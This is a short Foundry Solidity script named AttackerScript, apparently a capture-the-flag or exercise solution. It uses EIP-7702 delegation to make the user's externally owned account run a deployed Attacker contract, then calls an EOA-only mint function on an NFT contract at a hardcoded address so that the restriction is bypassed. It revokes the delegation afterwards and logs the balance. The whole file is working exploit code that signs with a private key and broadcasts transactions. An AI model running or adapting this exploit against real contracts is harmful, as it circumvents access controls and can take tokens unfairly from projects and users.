// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script,console} from "forge-std/Script.sol";

import {IUniqueNFT} from "src/IUniqueNFT.sol";
import {Attacker} from "src/Attacker.sol";

contract AttackerScript is Script {

    IUniqueNFT target = IUniqueNFT(0xA4f0cDd7922e225f9Ce6aA3662C2818387C7152B);

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Attacker attacker = new Attacker();

        uint256 pk = vm.envUint("PRIVATE_KEY");

        vm.signAndAttachDelegation(address(attacker), pk);

        Attacker(msg.sender).setUp(target);
        target.mintNFTEOA();

        vm.signAndAttachDelegation(address(0), pk);

        console.log("my balance:", target.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
